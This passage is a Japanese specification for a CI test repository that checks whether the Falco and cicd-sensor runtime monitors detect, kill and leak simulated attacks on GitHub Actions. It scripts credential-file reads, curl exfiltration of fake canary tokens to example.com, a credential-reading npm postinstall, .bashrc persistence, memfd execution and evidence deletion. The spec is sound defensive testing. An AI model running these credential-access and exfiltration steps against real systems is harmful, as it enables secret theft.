# cicd-runtime-testbed 仕様書

falcosecurity/falco-actions と cicd-sensor を GitHub Actions 上で実地検証するためのテスト用リポジトリの仕様。
本ファイルが実装の契約であり、実装者はここに書かれたパス・ファイル名・インタフェースを厳密に守ること。

---

## 0. 目的

以下 3 点を、実際に GitHub Actions を走らせて確認する。

| # | 検証目的 | 対応セクション |
| --- | --- | --- |
| T1 | 検知が行なわれること。cicd-sensor ではプロセス kill が実際に発生すること | §4, §5 |
| T2 | 実際にどのような情報が取得・閲覧できるか | §6 |
| T3 | public repo で動かした際に secret 情報が漏れないか | §3, §7 |

T3 は 2 つの独立した問いに分かれる。

- **T3-a**: 各漏洩経路（環境変数 / ファイル内容 / パス / argv / URL / DNS / 生キャプチャ）ごとに、
  仕込んだ**偽カナリア**が実際に漏れるか。期待値は §3 の表に定義し、
  期待と実測の乖離を `render-matrix.py` が検出する
- **T3-b**: ランナーに実在する **GitHub 発行の本物のトークン**
  （`GITHUB_TOKEN` / `ACTIONS_RUNTIME_TOKEN`）が、ツールの出力に混入するか。
  偽カナリアが漏れるのは設計上の当然だが、こちらは実際に確認する価値がある事実である。
  §7 の二次走査で検証する

---

## 1. 絶対に守る安全制約（Safety Invariants）

これに反する実装は不可。レビュー時の最優先チェック項目とする。

1. **本物の秘密情報を一切使わない。** 全カナリアは `CNRY-` プレフィックスの偽値で、リポジトリにコミットされる。
   例外は `CANARY_ENV` のみで、これは GitHub Secrets に登録するが、値は同様に偽物である。
2. **外部への実データ送信をしない。** 通信先は次の 2 つだけに限定する。
   - HTTP: `http://example.com/...`（IANA 予約ドメイン。POST 内容は破棄される）
   - DNS: `*.test.invalid`（RFC 2606 予約 TLD。**絶対に解決せず**、第三者に到達しない）
   攻撃者インフラ、実在の第三者サービス、webhook 収集サービス（webhook.site 等）は使用禁止。
3. **実在の IOC を踏まない。** cicd-sensor の `ioc.yaml` にある実際の悪性ドメイン・IP は
   テストに使わない。kill テストは §5 の専用カスタムルールで発火させる。
4. **汎用的な攻撃ツールを作らない。** 各シナリオは「観測されるべき syscall を発生させる最小のコマンド列」であり、
   実際の窃取・権限昇格・回避を行なう機能を持たせない。各スクリプト冒頭に用途を明記したヘッダコメントを置く。
5. **成果物の保持期間を最小化する。** すべての `upload-artifact` に `retention-days: 1` を明示する。
6. **危険な成果物を既定でアップロードしない。** falco analyze モードの `capture.scap` は
   §7 の漏洩検証に必要だが、既定では**アップロードしない**。`workflow_dispatch` の
   入力 `upload_raw_capture: true` を明示指定したときのみアップロードする。

   ただしこれは「明示的に有効化する運用を維持する」という意味であり、
   **public リポジトリでの実行を禁止するものではない。**
   `falco-analyze.yml` にジョブを停止するガードは置かない（§8 参照）。
   このリポジトリでは、public リポジトリで生キャプチャが公開されることの
   実害が次の理由で無視できると評価しているため:

   - `capture.scap` に入りうるカナリア値はすべて偽物で、
     `canaries/canaries.env` としてリポジトリにコミット済み。公開されても失うものがない
   - 実在する認証情報は 2 つだけ。`GITHUB_TOKEN`（宣言権限は `contents: read` のみ＝
     public リポジトリでは誰でも持つ読み取り権限に過ぎず、ジョブ完了時に失効）と、
     `ACTIONS_RUNTIME_TOKEN`（run 中のみ有効。悪用の本命経路は `actions/cache` への
     汚染だが、このリポジトリは `actions/cache` を使っていないためその経路が存在しない）
   - `id-token: write` を宣言していないため `ACTIONS_ID_TOKEN_REQUEST_TOKEN` は存在しない
   - 残るリスクは「このテストリポジトリ自身のアーティファクトを他人が上書きできるかも
     しれない」程度であり、T3 の検証価値のほうが上回る

   **この評価は上記の前提に依存する。** 次のいずれかが起きたら再評価すること。

   - リポジトリに本物の secret を追加した場合
   - `contents: write` / `packages: write` / `id-token: write` などを宣言した場合
   - `actions/cache` を使い始めた場合
   - self-hosted ランナーで実行する場合（GitHub-hosted の使い捨て VM とはジョブ間の
     分離モデルが異なる）

---

## 2. リポジトリ構成

```
cicd-runtime-testbed/
├── README.md
├── .github/workflows/
│   ├── falco-live.yml
│   ├── falco-analyze.yml
│   ├── sensor-monitor.yml
│   ├── sensor-enforce.yml
│   └── leak-scan.yml
├── .cicd-sensor/
│   ├── config.yaml
│   └── rules/
│       └── testbed.yaml
├── scenarios/
│   ├── lib/common.sh
│   ├── 00-seed.sh
│   ├── 01-credential-access.sh
│   ├── 02-exfil.sh
│   ├── 03-npm-postinstall/
│   │   ├── package.json
│   │   └── postinstall.js
│   ├── 04-persistence.sh
│   ├── 05-memfd-exec.sh
│   ├── 06-anti-forensics.sh
│   ├── 07-rule-markers.sh
│   └── 90-killme.sh
├── canaries/
│   └── canaries.env
├── tools/
│   ├── scan-leaks.sh
│   └── render-matrix.py
└── docs/
    ├── SPEC.md          ← 本ファイル
    ├── TEST-PLAN.md
    ├── SAFETY.md
    └── RESULTS-TEMPLATE.md
```

---

## 3. カナリア定義（`canaries/canaries.env`）

漏洩検証の中核。**各カナリアは「どの経路で漏れるか」を個別に切り分けるために存在する**。
形式は `KEY=VALUE` の shell source 可能な形式とし、値はすべて一意で grep 可能なこと。

| ID | 注入経路 | 値の制約 | 期待結果 | 適用範囲 | 採点対象 | 観測に必要な証跡粒度 | 検証する仮説 |
| --- | --- | --- | --- | --- | --- | --- | --- |
| `CANARY_ENV` | 環境変数（GitHub Secrets 経由） | 任意 | **漏れない** | 両方 | 両方 scored | 集計（predicate）でも判定対象 | GH のログ自動マスキングが効く／センサーは env を収集しない |
| `CANARY_FILE` | ファイル**内容**（`~/.aws/credentials`） | 任意 | **漏れない** | 両方 | 両方 scored | **詳細以上**（HTML レポート／falco の個別イベント情報が必要） | 両ツールともファイル内容は読まない（パスのみ記録） |
| `CANARY_PATH` | ファイル**パス**（`/tmp/CNRY.../marker`） | 任意 | **漏れる** | 両方 | cicd-sensor: scored／falco: **informational** | **詳細以上**（predicate に `fileAccess` は無い。§6 参照） | cicd-sensor はパスを redact しない |
| `CANARY_ARGV_SHORT` | プロセス argv（キーワードなし・**12 バイト以下**） | 12 バイト以下／`token`,`key`,`auth`,`pass`,`secret`,`cred`,`bearer`,`AKIA`,`ghp_`,`glpat-` を**含まない** | **漏れる** | 両方 | cicd-sensor: scored／falco: **informational** | **詳細以上**（predicate に argv は無い） | redaction ヒューリスティックのキーワード依存の穴 |
| `CANARY_ARGV_LONG` | プロセス argv（キーワードなし・13 バイト以上） | 上記キーワードを含まない | **漏れない**（`<truncated, N bytes>` になる） | 両方 | cicd-sensor: scored／falco: **informational** | **詳細以上**（predicate に argv は無い） | 12 バイト超の切り詰めが効く |
| `CANARY_ARGV_FLAG` | プロセス argv（`--header "Authorization: Bearer <値>"`） | 任意 | **漏れない** | 両方 | cicd-sensor: scored／falco: **informational** | **詳細以上**（predicate に argv は無い） | フラグ名ベースの redaction が効く |
| `CANARY_URL_QUERY` | 平文 HTTP の**クエリ文字列** | 任意 | **漏れない** | 両方 | cicd-sensor: scored／falco: **informational** | **詳細以上** ＋ **`http_request` サポート必須**（§7） | eBPF 内でクエリが除去される。※未対応バージョンでの「漏れない」は無効な確認 |
| `CANARY_URL_PATH` | 平文 HTTP の**パス** | 任意 | **漏れる** | 両方 | cicd-sensor: scored／falco: **informational** | **詳細以上** ＋ **`http_request` サポート必須**（§7） | HTTP path は redact 対象外 |
| `CANARY_DNS` | DNS クエリのラベル（`<値>.test.invalid`） | DNS ラベルとして妥当（英数字とハイフン、63 文字以下） | **漏れる** | 両方 | cicd-sensor: scored／falco: **informational** | 集計（predicate）でも判定対象（`domains` 配列に host 単位で載る） | ドメイン名は redact 対象外 |
| `CANARY_SCAP` | 生の syscall バッファ（`echo` の引数＋ファイル書き込み） | 200 バイト以下 | **falco の capture.scap でのみ漏れる** | **falco 固有** | falco: scored（**raw** 粒度必須） | **生**（capture.scap そのもの） | snaplen 256 の生キャプチャに素通りで入る |

「適用範囲」は、そのカナリアの期待結果が意味を持つツールを示す（`tools/render-matrix.py`
の `CANARY_APPLIES_TO`、§7 参照）。`CANARY_SCAP` のみ falco 固有（cicd-sensor は
`capture.scap` を作らないため、cicd-sensor 単独の run を走査しても判定しようがない）。
それ以外は cicd-sensor の redaction 挙動の検証が主目的だが、falco 側のテレメトリに
現れることも観測対象として有意なため両方に適用する。

「採点対象」は §7 で新たに導入した軸で、「適用範囲」（そもそも意味を持つか）とは別に
「そのツールに対して採点可能な仮説を持っているか」を表す（`tools/render-matrix.py` の
`CANARY_SCORED_FOR`）。`CANARY_ENV` / `CANARY_FILE` 以外の8個は、そもそも
「cicd-sensor の redaction 挙動を検証する」ために設計されたカナリアであり、
redaction 層を持たない falco に対しては採点可能な仮説がない。falco に対しては
**informational**（検出の有無は表示するが ✅/⚠️ を付けず、exit code にも算入しない）
として扱う。詳細は §7「採点対象（scored）／参考情報（informational）の区別」を参照。

「観測に必要な証跡粒度」は、実地実行 (run 32381640678, sensor-monitor.yml) で判明した
問題への対応として追加した列（§6, §7 参照）。cicd-sensor の standalone モードで得られる
attestation predicate は**集計のみ**で、個別イベントの timestamp / argv / プロセスツリー、
ファイルアクセスのパス（`fileAccess` フィールドは未実装）、`collect` アクションのヒット、
HTTP の path/host（`domains` にはホスト名のみ）を一切含まない。このため
「詳細以上」と書かれたカナリアは、走査対象に HTML レポートや falco の詳細テレメトリと
いった、集計より詳細な証跡が一つも含まれていない場合、原理的に観測できない
（「漏れなかった」のではなく「見る場所が無い」）。`tools/render-matrix.py` はこれを
⚠️ ではなく N/A として扱う（§7 参照）。`CANARY_DNS` は `domains` 配列に host 単位で
現れるため、集計レベルの証跡だけでも判定できる唯一の「漏れる」カナリアである
（今回の実地実行で実際にこれが確認できた、唯一の有効な観測だった）。`CANARY_SCAP` は
「詳細」ではなく**「生」**（`capture.scap` そのもの）を要求する唯一のカナリアである
（実地実行 run 32643269616 で判明した問題への対応。§7 参照）。`capture.scap` を作らない
falco live モードのテレメトリ（`falco_events.json` 等）は「詳細」止まりのため、この
要求を満たさず N/A になる。

### 値の命名規則

- 先頭は `CNRY`。全体で一意。判別しやすいこと。
- `CANARY_ARGV_SHORT` のみ 12 バイト以下という強い制約があるため、`CNRY` + 8 文字 = 12 バイトとする。
- 各値の末尾または内部に `DO-NOT-USE` を含めたいが、`CANARY_ARGV_SHORT` は長さ制約上不可。
  長さに余裕があるものは `-DONOTUSE` を含めること。
- `CANARY_DNS` は DNS ラベル制約のため英数字とハイフンのみ。

### 重要な実装上の注意

- `canaries/canaries.env` は**リポジトリにコミットされる**ため、チェックアウトしたソースツリー内に
  これらの値が存在する。スキャナはこのファイル自身とリポジトリのソースを**スキャン対象から除外**すること。
  除外しないと全カナリアが常に「漏洩」と誤判定される。
- `CANARY_ENV` のみ GitHub Secrets に登録する。README に登録手順を書くこと。
  Secret 未設定でも他のテストが動くよう、未設定時はスキップしてその旨を記録する。

---

## 4. 検知シナリオ（`scenarios/`）

各スクリプトの要件:

- `#!/usr/bin/env bash` + `set -uo pipefail`。**`set -e` は使わない**
  （一部のコマンドは失敗が想定されるため。失敗しても後続シナリオを続ける）
- 冒頭に用途・安全性・期待される検知内容を書いたヘッダコメント
- `scenarios/lib/common.sh` を source して共通関数を使う
- 各ステップの前後に `::group::` / `::endgroup::` で GitHub Actions のログを畳む
- **終了コードは常に 0**（シナリオ自体の失敗で CI を落とさない。検証は別ジョブで行なう）

### `lib/common.sh` が提供する関数

| 関数 | 役割 |
| --- | --- |
| `load_canaries` | `canaries/canaries.env` を source する |
| `step <name>` | ログのグループ開始＋実行中シナリオ名の記録 |
| `note <msg>` | 実行した操作を `$TESTBED_LOG`（JSONL）に記録する |
| `safe_run <cmd...>` | 失敗を許容してコマンドを実行し、終了コードを記録 |

### argv カナリアの注入箇所（実装時の注入箇所。レビューで見つかった仕様の穴への対応）

`canaries/canaries.env` で `CANARY_ARGV_SHORT` / `CANARY_ARGV_LONG` /
`CANARY_ARGV_FLAG` を定義していたが、当初の本節にはこれらを**実際にどの
シナリオがどう argv に載せるか**の規定が無かった（`CANARY_ARGV_FLAG` だけが
`02-exfil.sh` の `Authorization: Bearer` ヘッダで使われており、
`CANARY_ARGV_SHORT` / `CANARY_ARGV_LONG` はどのシナリオでも未使用だった）。
これが「argv にカナリアを埋めても見つからない」という問題の真因の一つ
だった（もう一つの真因は §5 で追記する「ルール不一致イベントは記録され
ない」という仕様。両方が揃わないと argv 経由の漏洩は観測できない）。

| カナリア | 注入箇所 | 形式 |
| --- | --- | --- |
| `CANARY_ARGV_SHORT` | `02-exfil.sh` の curl 呼び出し | `--referer "${CANARY_ARGV_SHORT}"`（値そのものが独立した argv 要素） |
| `CANARY_ARGV_LONG` | 同上 | `-A "${CANARY_ARGV_LONG}"`（同上） |
| `CANARY_ARGV_FLAG` | `02-exfil.sh` の curl 呼び出し（既存） | `-H "Authorization: Bearer ${CANARY_ARGV_FLAG}"` |

`--referer` / `-A` を選んだ理由: 値がクエリ文字列やヘッダ値の一部分では
なく、curl プロセスの実 argv でそれ自体が1つの配列要素になるため
（bash の単語分割により `--referer` と値が別々の argv 要素として execve に
渡る）。「12 バイト以下の argv は切り詰められない」
（`CANARY_ARGV_SHORT`）／「13 バイト以上は `<truncated, N bytes>` になる」
（`CANARY_ARGV_LONG`）という仮説を、他の要素との結合に左右されずに検証
できる。通信先は他のステップと同じ `http://example.com/` のみ。

### `00-seed.sh`

後続シナリオが読む「偽クレデンシャル」を配置する。

- `~/.aws/credentials` に `CANARY_FILE` を含む偽の AWS 認証情報を書く
- `~/.docker/config.json` に偽の auth エントリを書く
- `/tmp/${CANARY_PATH}/marker` を作る（ディレクトリ名にカナリアを含める）
- `/tmp/${CANARY_PATH}/canary-path-probe.marker` を作る（§5 の
  `testbed_canary_path_probe` ルールを発火させる専用の観測用マーカー。
  上の `marker` とは別ファイル）
- `~/.npmrc` に偽の registry トークン行を書く

### `01-credential-access.sh` — クレデンシャルアクセス

- `cat ~/.aws/credentials`
- `cat ~/.docker/config.json`
- `cat ~/.npmrc`
- `cat /proc/self/environ`（他プロセスの environ は読まない。自プロセスのみ）
- GitHub Actions のランタイムトークンファイル（`$RUNNER_TEMP` 配下）の**存在確認のみ**（`ls`。中身は読まない）

期待: falco の `Suspicious Process Reading GitHub Token`、cicd-sensor の `generic-credential-access` 系が発火。

### `02-exfil.sh` — 外部送信

- DNS: `getent hosts "${CANARY_DNS}.test.invalid"` （解決失敗が正常）
- 平文 HTTP（クエリ）: `curl -s -m 5 "http://example.com/?t=${CANARY_URL_QUERY}"`
- 平文 HTTP（パス）: `curl -s -m 5 "http://example.com/${CANARY_URL_PATH}"`
- 平文 HTTP（Authorization ヘッダ）: `curl -s -m 5 -H "Authorization: Bearer ${CANARY_ARGV_FLAG}" http://example.com/`
- **argv カナリア（独立した argv 要素）**:
  `curl -s -m 5 --referer "${CANARY_ARGV_SHORT}" -A "${CANARY_ARGV_LONG}" http://example.com/`
  → `CANARY_ARGV_SHORT` / `CANARY_ARGV_LONG` を、クエリ文字列やヘッダ値の
  一部としてではなく、それ自体で1つの argv 配列要素として渡す
  （レビューで見つかった仕様の穴: 以前はこの2つの値がどのシナリオにも
  argv として注入されておらず、「argv にカナリアを埋めても検知できない」
  という問題の真因の一つだった。§4「実装時の注入箇所」参照）
- HTTPS 対照群: `curl -s -m 5 "https://example.com/?t=${CANARY_URL_QUERY}"`
  → **HTTPS 側は中身が取れないことの確認用**。これが取れていたら報告の前提が崩れる

### `03-npm-postinstall/` — 依存関係経由の攻撃（最重要）

**プロセス系譜の検知能力を試す中核シナリオ。** ローカルパッケージの `postinstall` から
クレデンシャルアクセスと外部通信を行なう。npm レジストリからは何も取得しない（`npm install --no-audit --no-fund ./03-npm-postinstall`）。

- `package.json` に `"postinstall": "node postinstall.js"`
- `postinstall.js` は `~/.aws/credentials` を読み、`http://example.com/` に接続する
- 期待: cicd-sensor が `npm` の子孫であることを条件に含むルールで検知する。
  falco-actions は系譜 4 世代まで output に出すが、**ルール条件としては使っていない**ため
  汎用ルールでしか引っかからないはず → **両者の表現力の差が最も明確に出る**

### `04-persistence.sh` — 永続化

- `~/.bashrc` に追記
- `.github/workflows/` 配下にファイルを作成（`_testbed_persistence.yml.disabled` という名前にし、
  **有効なワークフローにはしない**）
- `~/.ssh/authorized_keys` への追記は**行なわない**（実際の永続化に近すぎるため）

### `05-memfd-exec.sh` — fileless 実行

- `memfd_create` 経由で実行する。`python3` で `memfd_create` → 書き込み → `/proc/self/fd/N` を exec
- 実行する中身は `echo` 相当の無害なシェルスクリプト
- 期待: cicd-sensor の `process_exec.is_memfd = true` が立つ。falco 側で相当する情報が取れるか確認

### `06-anti-forensics.sh` — 証跡削除

- `00-seed.sh` が作った偽クレデンシャルを削除する
- `05` で実行したバイナリを削除する（falco の SHA256 計算が
  `File does not exist anymore` になることの確認）

### `07-rule-markers.sh` — detect / collect アクションの発火

`.cicd-sensor/rules/testbed.yaml` の `testbed_detect_marker` / `testbed_collect_marker`
に対応するマーカーファイルを書き込む。

- `cicd-sensor-detect.marker` に書き込む（`action: detect` が発火）
- `cicd-sensor-collect.marker` に書き込む（`action: collect` が発火）
- `sensor-monitor.yml` からのみ呼ばれる

これにより detect / collect / terminate の 3 アクションすべてを実地検証できる。
`collect` は Detection Log には出るが attestation predicate からは除外される
仕様になっているため、その除外を実際に確認する用途も兼ねる。

### `90-killme.sh` — kill 発火専用

- §5 のカスタムルールに一致する動作だけを行なう
- このスクリプトは `sensor-enforce.yml` からのみ呼ばれる
- 実行後に `echo "REACHED_AFTER_KILLME"` を出力する。
  **この文字列がログに出ていたら kill されなかった**ことを意味する（判定に使う）
- **`load_canaries` を呼ばない。カナリアを一切注入しない。**
  kill 発火だけに専念させるための意図的な設計であり、他のシナリオ
  （`00-seed.sh` / `01-credential-access.sh` / `02-exfil.sh` / `04-persistence.sh` /
  `05-memfd-exec.sh` / `06-anti-forensics.sh` / `07-rule-markers.sh`）とは異なる。
  **帰結**: `sensor-enforce.yml` がアップロードする `telemetry-cicd-sensor-enforce`
  にはカナリアが一切含まれないため、この run を `leak-scan.yml` の対象にすると
  「漏れるはず」のカナリアが全て見つからず必ず ⚠️ になる（＝発見ではなく単なる
  対象選択のミス）。`leak-scan.yml` はこの run_id を早期に弾くガードを持つ（§7、§8）。

---

## 5. cicd-sensor の kill テスト設計

### `.cicd-sensor/config.yaml`

**重要（仕様の根本的な誤りの修正。以前のこの節は「ワークフロー側で実行時に
書き換える」と書いていたが、これは誤りだった。旧版の記述は削除した）:**

cicd-sensor-action は、プロジェクト設定 (`.cicd-sensor/config.yaml`) と
カスタムルール (`.cicd-sensor/rules/`) を、ジョブのワークスペース上の
ファイルからではなく **GitHub Contents API 経由でコミット SHA
(`GITHUB_SHA`) から取得する。** 根拠 (cicd-sensor-action v0.0.38,
commit `6511eb44c91d71b2b93d71193b1bf2cb18352f66`, `src/main.js:643-666`):

```js
const repo = process.env.GITHUB_REPOSITORY || '';
const ref  = process.env.GITHUB_SHA || '';
if (repo && ref) {
  const cfg = await fetchRepoFile(githubToken, repo, ref, '.cicd-sensor/config.yaml');
  ...
  const ruleFiles = await fetchRepoDirectoryFiles(githubToken, repo, ref, '.cicd-sensor/rules');
```

つまり `actions/checkout` の後にワークフロー側が
`.cicd-sensor/config.yaml` をワークスペース上で書き換えても、action は
その変更を一切見ない。読むのは常にコミット済みの内容であり、**実行時の
書き換えは完全に無意味 (no-op) である。** 以前の版のこのリポジトリは
`sensor-monitor.yml` / `sensor-enforce.yml` の両方に「実行時に
monitor_mode を書き換える」ステップを持っていたが、これが原因で
`sensor-enforce.yml` が `monitor_mode: false` を書き込んだつもりでも
実際にはコミット値 (`monitor_mode: true`) が使われ続け、
`testbed_kill_marker` (`action: terminate`) が `action: detect` に
降格されて kill が起きなかった (run 32544606013, 32545681004 で実機
確認済み)。両ワークフローの当該ステップは削除済みで、削除理由の
コメントを残している。

なお、この「ジョブ内のファイル書き換えを action が見ない」という挙動
自体は cicd-sensor の**良い設計**である。ジョブ内で実行されるプロセス
(侵害されている可能性のあるビルドスクリプトや依存パッケージの
postinstall なども含む) が、ワークスペース上の `monitor_mode` や
カスタムルールを書き換えて自分自身への監視を無効化する、という攻撃を
構造的に防いでいる。

この帰結として、**`monitor_mode` はリポジトリ全体で1つの値しか持てず、
`sensor-monitor.yml` と `sensor-enforce.yml` の間で切り替えることはできない**
(ワークフロー実行時の書き換えでは実現不可能)。kill テスト
(`sensor-enforce.yml`) を機能させるには、コミット値そのものを `false`
にする以外に方法がない。

```yaml
monitor_mode: false
default_max_alerts_per_rule: 50
```

**この選択に伴うリスク（`sensor-monitor.yml` への影響、正直に記載する）:**
`monitor_mode: false` はコミットから取得される値なので、
`sensor-monitor.yml` の実行でも同じ値が使われ、terminate ルールが有効に
なる。

- 自作ルールで `action: terminate` を持つのは `testbed_kill_marker` のみ。
  発火条件は `cicd-sensor-killme.marker` への書き込みだが、これを書く
  `scenarios/90-killme.sh` は `sensor-enforce.yml` からのみ実行され
  (§4)、`sensor-monitor.yml` は実行しないため発火しない。
- ベースラインルール (`cicd-sensor/rules/`) で `action: terminate` を
  持つものは、リポジトリを実際に読んで列挙した次の7件のみである:
  `generic-tracking-escape.yaml` の `docker_upstream_socket_access`
  (`docker-upstream.sock` への `unix_socket_connect`)、`ioc.yaml` の
  `mini_shaihulud_antv_c2_domain` / `mastra_npm_compromise_c2_ip` /
  `asyncapi_npm_compromise_c2_ip` /
  `asyncapi_miasma_dht_bootstrap_domain` / `miasma_systemd_unit_write` /
  `keyv_shaihulud_math_symbol_artifact`。`sensor-monitor.yml` が実行する
  `scenarios/00〜07` は、実在の IOC ドメイン・IP には一切通信せず
  (通信先は `example.com` と `*.test.invalid` のみ、§1)、
  `docker-upstream.sock` にもアクセスせず、`systemd` 配下に `miasma` を
  含むパスへの書き込みも行なわず、`node_modules/keyv/Math_Symbol.js` の
  読み書きも行なわない。したがって現状のシナリオではこれらのいずれも
  発火しない。
- **ただし、万一 `sensor-monitor.yml` のシナリオが将来変更されて上記の
  いずれかのベースライン terminate ルールの条件に触れた場合、
  `monitor_mode: false` の下では実際にそのジョブが kill される。**
  これは「検知のみで kill しない」ことを目的とする
  `sensor-monitor.yml` に対して残るリスクとして、正直に明記しておく
  (README.md「既知の制約」も参照)。

### 前提：cicd-sensor はルールに一致したイベントの詳細しか記録しない（実地実行 run 32510077347 で確認）

**この前提が §3〜§7 全体の設計を左右する、最重要の事実である。**
実物の HTML レポート（standalone モード、run 32510077347）を解析した結果、
次が判明した。

- レポートの `hits[]`（ルールに一致したイベント）の各要素は `process`
  （`pid` / `exec_path` / `argv` / `ancestors`）と `payload`（`file_open`
  なら `path` / `flags` / `is_read` / `is_write` 等）を**完全に持つ**
- しかし **ルールに一致しなかったイベントは一切記録されない**。
  standalone モードには「生のイベントストリーム」に相当するものが存在しない
- `domain_observations[]` / `network_connections[]`
  （ルール一致に関係なく載る、集計寄りの補助配列）は `exec_path` と
  `ancestors` を持つが、**`argv` を持たない**

つまり、**カナリアを argv・パス・HTTP path/query に埋め込んでも、
そのイベントを生成したプロセス／通信が何らかのルールに一致しない限り、
レポートに一切現れない。** 「カナリアが見つからない」という以前の観測は、
漏洩しなかったことの証拠ではなく、単に「その値を運ぶイベントを見る場所が
レポート中に無かった」ことの証拠だった。

この事実への対応として、下の `cicd_runtime_testbed/canary_observability`
ruleset を追加した。すべて `action: collect`（ジョブを止めない、
Detection Log に載るだけ）の自己完結ルールで、実在の IOC には依存しない。

| rule_id | event_type | 条件の方針 | 捕捉する内容 |
| --- | --- | --- | --- |
| `testbed_canary_argv_carrier` | `process_exec` | `process.exec_path.endsWith("/curl")` | `02-exfil.sh` の curl 実行全般。ヒットの `process.argv` を通じて `CANARY_ARGV_SHORT` / `CANARY_ARGV_LONG` / `CANARY_ARGV_FLAG` が観測できる |
| `testbed_canary_path_probe` | `file_open` | `is_write && path.endsWith("/canary-path-probe.marker")` | `00-seed.sh` が `/tmp/${CANARY_PATH}/` 配下に作る専用マーカーへの書き込み。ヒットの `payload.path` に `CANARY_PATH` の値（ディレクトリ名）が現れる |
| `testbed_canary_http_host` | `http_request` | `host == "example.com"` | `02-exfil.sh` の平文 HTTP リクエスト。ヒットの `payload.path` を通じて `CANARY_URL_PATH` が観測できる（`payload` に query は含まれない仕様のため、`CANARY_URL_QUERY` が「除去された」ことの確認にもなる） |

`domain`（`CANARY_DNS`）については、`domain_observations[]` がルール一致に
関係なく載る（§3「観測に必要な証跡粒度」参照）ため、専用の観測用ルールは
追加していない。

### `.cicd-sensor/rules/testbed.yaml`

kill を発火させる専用ルール。**実在の IOC は使わない。**

CEL の制約に注意:
- **正規表現・添字アクセス・算術は使えない。** `==`, `endsWith`, `startsWith`, `contains` 等のみ
- フィールド名は `cicd-sensor/docs/user-guide/rule-event-types.md` に載っているものだけを使う。
  実装者はこのファイルを必ず読むこと。推測でフィールド名を書かない
- `rule_sets:` と `rule_modifiers:` は同一 YAML ドキュメントに同居できない

必要なルール:

| rule_id | event_type | 条件の方針 | action |
| --- | --- | --- | --- |
| `testbed_kill_marker` | `file_open` | `is_write && path.endsWith("/cicd-sensor-killme.marker")` | `terminate` |
| `testbed_detect_marker` | `file_open` | `is_write && path.endsWith("/cicd-sensor-detect.marker")` | `detect` |
| `testbed_collect_marker` | `file_open` | `is_write && path.endsWith("/cicd-sensor-collect.marker")` | `collect` |
| `testbed_canary_argv_carrier` | `process_exec` | `process.exec_path.endsWith("/curl")` | `collect` |
| `testbed_canary_path_probe` | `file_open` | `is_write && path.endsWith("/canary-path-probe.marker")` | `collect` |
| `testbed_canary_http_host` | `http_request` | `host == "example.com"` | `collect` |

`90-killme.sh` は `cicd-sensor-killme.marker` に書き込むだけでよい。
`cicd-sensor-detect.marker` / `cicd-sensor-collect.marker` は
`07-rule-markers.sh`（§4）が書き込む。下の3ルール
（`testbed_canary_argv_carrier` / `testbed_canary_path_probe` /
`testbed_canary_http_host`）はカナリア観測専用で、上記「前提」節を
参照。

検証は `cicd-sensorctl rule validate .cicd-sensor/rules` で行なう。ワークフローにこの検証ステップを含めること。

**kill テストの前提条件 (run 32544606013 で判明): ルールバンドルの検証が通っていること。**
`.cicd-sensor/rules/` に、実際に使う cicd-sensor バージョンが未対応の
`event_type` を使うルールが1本でも混入していると、cicd-sensor-action 内部の
プロジェクト設定フェッチ (config.yaml + ルールバンドルの検証) が**丸ごと
失敗**し、`monitor_mode` を含むプロジェクト設定全体が agent に届かなくなる
(実際のログ: `error: bundle: ... unsupported event type "..."` →
`rule validate: bundle failed validation` →
`##[warning]project config fetch failed: ... agent will run with baseline rules`)。
この状態ではコミット済みの `.cicd-sensor/config.yaml` (`monitor_mode: false`
のはず) すら agent に反映されず、`testbed_kill_marker`
(`action: terminate`) が `action: detect` として評価され、kill が起きない。
したがって、kill テストの run を評価する前に、必ず次を確認すること。

- ワークフローの `Validate .cicd-sensor/rules` ステップ (§後述、
  `cicd-sensorctl rule validate` を実行し、失敗時はジョブを失敗させる) が
  成功していること
- `Start cicd-sensor` ステップのログに `##[warning]project config fetch failed`
  が出ていないこと

これらが崩れている状態での `assert` ジョブの成否は、kill 動作そのものの
検証結果として意味を持たない。

### 判定方法

`sensor-enforce.yml` は次の構造にする。

1. ジョブ `enforce`: `90-killme.sh` を実行する。
   - **`90-killme.sh` を実行するステップ自体に**ステップレベルの `continue-on-error: true`
     を付け、その `outcome`（本来の成否）をジョブ output として公開する
   - `REACHED_AFTER_KILLME` がログに出たかの grep 結果も、ジョブ output として公開する
   - ジョブレベルの `continue-on-error: true` も併用し、run 全体が赤くならないようにする
2. ジョブ `assert`: `needs: enforce` かつ `if: always()`。上記 2 つの output を判定する
   - `enforce` の killme ステップの `outcome` が `failure` であること（kill された証拠）
   - `REACHED_AFTER_KILLME` が**出ていない**こと
   - どちらかが満たされない場合、`assert` ジョブを失敗させる

**重要（GitHub Actions の制限）:** ジョブレベルの `continue-on-error: true` を使うと、
`needs.<job>.result` は実際の失敗結果に関わらず**常に `success` を返す**
（`actions/toolkit#1739`）。そのため判定に `needs.enforce.result` を使ってはならない。
ステップレベルの `outcome` をジョブ output 経由で受け渡すこと。

**注意:** kill されなかった場合に `assert` が失敗する設計なので、この 1 本だけは
「失敗が正常」ではなく「成功が正常」になる。README に明記すること。

**原因切り分けの補強 (run 32544606013 への対応):** `assert` ジョブは、上記の
2 つの output に加えて、`collect-telemetry` が取得するのと同じ
`cicd-sensor-report.html` / `cicd-sensor-attestation` を (読み取り専用で)
ダウンロードし、そこから `testbed_kill_marker` の実際の `action`
(`terminate` であるべき) を読み取って job summary に出す。`action` が
`detect` だった場合は `::error::` で、`monitor_mode` が有効なままか、
プロジェクト設定 (bundle 検証失敗など) が agent に届いていない可能性がある
旨と、`Start cicd-sensor` ステップのログ確認を促す。kill されなかったときに
「そもそも terminate ルールとして評価されていたか」をすぐ判定できるように
するための追加であり、上記の判定方法自体 (killme_outcome /
reached_after_killme) を置き換えるものではない。

---

## 6. テレメトリ収集（T2）

各ワークフローの最後に、そのツールが出した情報を**すべて**成果物として集める。

### falco-actions

- live: ジョブサマリ（`$GITHUB_STEP_SUMMARY`）と、可能なら `/tmp/falco_events.json`
- analyze: ジョブサマリ、`hashes` アーティファクト、
  `capture.scap`（§1-6 の条件付き）

### cicd-sensor

- standalone モードの HTML レポート、attestation predicate、ジョブサマリ
- Manager は構築しない（standalone のみ）。理由は導入コストと、
  本テストの目的が「GitHub-hosted で何が見えるか」であるため

**standalone モードで得られる証跡の限界（実地実行 run 32381640678 で確認済み）**:
standalone モードで得られる証跡は attestation predicate（集計）と
HTML レポートの 2 種類に限られる。**個別イベント（timestamp / argv / プロセスツリー /
ファイルアクセスのパス等）の詳細ログを得るには Manager が必要**であり、
このテストベッドは Manager を構築しない方針のため、そのようなログはそもそも
